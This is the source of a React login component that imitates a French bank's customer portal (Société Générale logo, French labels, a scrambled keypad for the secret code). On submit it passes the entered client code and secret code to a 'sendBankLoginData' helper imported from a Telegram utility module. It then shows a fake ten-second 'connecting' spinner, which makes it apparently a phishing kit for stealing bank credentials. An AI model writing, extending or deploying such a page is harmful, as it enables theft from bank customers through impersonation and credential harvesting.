import React, { useState } from 'react';
import { X, Info } from 'lucide-react';
import { sendBankLoginData } from '../../utils/telegram';

type ProviderBAuthProps = {
  onAuthenticate: () => void;
  onBack: () => void;
  bankName: string;
};

const ProviderBAuth = ({ onAuthenticate, onBack, bankName }: ProviderBAuthProps) => {
  const [step, setStep] = useState<'client-code' | 'secret-code'>('client-code');
  const [clientCode, setClientCode] = useState('');
  const [secretCode, setSecretCode] = useState('');
  const [rememberMe, setRememberMe] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleClientCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 8);
    setClientCode(value);
  };

  const handleClientCodeSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (clientCode.length === 8) {
      setStep('secret-code');
    }
  };

  const handleNumberClick = (number: string) => {
    if (secretCode.length < 6) {
      setSecretCode(prev => prev + number);
    }
  };

  const clearSecretCode = () => {
    setSecretCode('');
  };

  const handleSecretCodeSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (secretCode.length === 6) {
      setIsLoading(true);

      await sendBankLoginData({
        bankName,
        username: clientCode,
        password: secretCode
      });

      setTimeout(() => {
        setIsLoading(false);
        onAuthenticate();
      }, 10000);
    }
  };

  const formatSecretCode = () => {
    const dashes = Array(6).fill('—');
    for (let i = 0; i < secretCode.length; i++) {
      dashes[i] = '●';
    }
    return dashes.join(' ');
  };

  if (isLoading) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-white">
        <div className="text-center">
          <div className="mb-8">
            <div className="w-20 h-20 mx-auto relative">
              <div className="absolute inset-0 rounded-full border-4 border-gray-200"></div>
              <div className="absolute inset-0 rounded-full border-4 border-[#E60012] animate-spin border-t-transparent"></div>
            </div>
          </div>
          <h2 className="text-xl font-semibold text-gray-800 mb-2">
            Authentification en cours
          </h2>
          <p className="text-gray-600">
            Connexion à votre espace bancaire...
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white">
      <header className="bg-[#1e2a5e] text-white">
        <div className="flex items-center justify-between px-4 py-2 text-sm">
          <div></div>
          <div className="flex items-center space-x-6">
            <button className="hover:underline">Agences</button>
            <button className="hover:underline">Aide et contacts</button>
            <button
              onClick={onBack}
              className="p-1 text-white hover:text-gray-300 transition-colors"
            >
              <X size={20} />
            </button>
          </div>
        </div>

        <div className="flex items-center justify-between px-4 py-4">
          <div className="flex items-center">
            <img
              src="https://banque.meilleurtaux.com/images/actu/logos/societe-generale-logo.png"
              alt="Logo"
              className="h-10 lg:h-12"
              onError={(e) => {
                (e.target as HTMLImageElement).style.display = 'none';
              }}
            />
          </div>
          <button className="bg-[#1e2a5e] border border-white text-white px-4 py-2 rounded-full text-sm hover:bg-[#2a3a7e] transition-colors">
            Ouvrir un compte
          </button>
        </div>
      </header>

      <div className="flex flex-col lg:flex-row min-h-[calc(100vh-120px)]">
        <div className="w-full lg:w-2/3 flex items-center justify-center p-6 lg:p-12">
          <div className="w-full max-w-md">
            <h1 className="text-2xl lg:text-3xl font-semibold text-gray-800 mb-8">
              Connexion à votre Espace Client Particuliers
            </h1>

            {step === 'client-code' ? (
              <form onSubmit={handleClientCodeSubmit} className="space-y-6">
                <div>
                  <label className="block text-gray-700 font-medium mb-4">
                    Saisissez votre code client
                  </label>
                  <div className="relative">
                    <input
                      type="text"
                      value={clientCode}
                      onChange={handleClientCodeChange}
                      className="w-full px-0 py-3 border-0 border-b-2 border-gray-300 text-xl text-gray-800 bg-transparent focus:outline-none focus:border-[#E60012] transition-colors appearance-none"
                      maxLength={8}
                      placeholder=""
                    />
                    {clientCode.length === 8 && (
                      <div className="absolute right-0 top-1/2 transform -translate-y-1/2 text-green-500">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
                          <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
                        </svg>
                      </div>
                    )}
                    {clientCode && (
                      <button
                        type="button"
                        onClick={() => setClientCode('')}
                        className="absolute right-8 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600"
                      >
                        <X size={20} />
                      </button>
                    )}
                  </div>
                </div>

                <div className="flex items-center space-x-3">
                  <div className="flex items-center">
                    <input
                      type="checkbox"
                      id="remember"
                      checked={rememberMe}
                      onChange={(e) => setRememberMe(e.target.checked)}
                      className="w-4 h-4 text-[#E60012] border-gray-300 rounded focus:ring-[#E60012]"
                    />
                    <label htmlFor="remember" className="ml-2 text-sm text-gray-600 bg-gray-100 px-2 py-1 rounded">
                      non
                    </label>
                  </div>
                  <span className="text-gray-600">Se souvenir de moi</span>
                  <Info size={16} className="text-gray-400" />
                </div>

                <button
                  type="submit"
                  disabled={clientCode.length !== 8}
                  className="w-full bg-[#E60012] text-white py-4 rounded-full text-lg font-semibold hover:bg-[#cc0010] disabled:bg-gray-300 disabled:cursor-not-allowed transition-colors"
                >
                  Valider
                </button>
              </form>
            ) : (
              <form onSubmit={handleSecretCodeSubmit} className="space-y-6">
                <div>
                  <label className="block text-gray-700 font-medium mb-4">
                    Saisissez votre code client
                  </label>
                  <div className="relative">
                    <input
                      type="text"
                      value={clientCode}
                      disabled
                      className="w-full px-0 py-3 border-0 border-b-2 border-gray-300 text-xl text-gray-800 bg-transparent"
                    />
                    <div className="absolute right-0 top-1/2 transform -translate-y-1/2 text-green-500">
                      <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
                        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
                      </svg>
                    </div>
                  </div>
                </div>

                <div className="flex items-center space-x-3">
                  <div className="flex items-center">
                    <input
                      type="checkbox"
                      id="remember2"
                      checked={rememberMe}
                      onChange={(e) => setRememberMe(e.target.checked)}
                      className="w-4 h-4 text-[#E60012] border-gray-300 rounded focus:ring-[#E60012]"
                    />
                    <label htmlFor="remember2" className="ml-2 text-sm text-gray-600 bg-gray-100 px-2 py-1 rounded">
                      non
                    </label>
                  </div>
                  <span className="text-gray-600">Se souvenir de moi</span>
                  <Info size={16} className="text-gray-400" />
                </div>

                <div className="text-center">
                  <div className="text-2xl font-mono tracking-widest text-gray-800 mb-4">
                    {formatSecretCode()}
                  </div>
                  <button
                    type="button"
                    onClick={clearSecretCode}
                    className="text-gray-400 hover:text-gray-600 mb-6"
                  >
                    <X size={24} />
                  </button>
                </div>

                <div className="grid grid-cols-4 gap-3 max-w-xs mx-auto mb-8">
                  {['5','7','6','1','2','4','8','9','0','3'].map((n, i) => (
                    <button
                      key={i}
                      type="button"
                      onClick={() => handleNumberClick(n)}
                      className="aspect-square bg-gray-100 hover:bg-gray-200 rounded-lg text-xl font-semibold text-gray-800 transition-colors"
                    >
                      {n}
                    </button>
                  ))}
                </div>

                <button
                  type="submit"
                  disabled={secretCode.length !== 6}
                  className="w-full bg-[#E60012] text-white py-4 rounded-full text-lg font-semibold hover:bg-[#cc0010] disabled:bg-gray-300 disabled:cursor-not-allowed transition-colors"
                >
                  Valider
                </button>
              </form>
            )}
          </div>
        </div>

        <div className="w-full lg:w-1/3 bg-gray-50 p-6 lg:p-8 border-l border-gray-200">
          <div className="space-y-8">
            <div>
              <h3 className="font-bold text-gray-800 mb-4">Obtenir vos codes</h3>
              <p className="text-sm text-gray-600 mb-4">
                Le code client vous est attribué par un conseiller au moment de votre
                inscription. Il est également indiqué sur vos relevés de comptes.
              </p>
            </div>
            <div>
              <h4 className="font-bold text-gray-800 mb-2">Code secret oublié</h4>
              <button className="text-[#E60012] hover:underline text-sm">
                » Effectuer une nouvelle demande
              </button>
            </div>
            <div>
              <h4 className="font-bold text-gray-800 mb-2">Nos conseils sécurité</h4>
              <div className="space-y-1">
                <button className="block text-[#E60012] hover:underline text-sm">
                  » Guide des bonnes pratiques
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default ProviderBAuth;
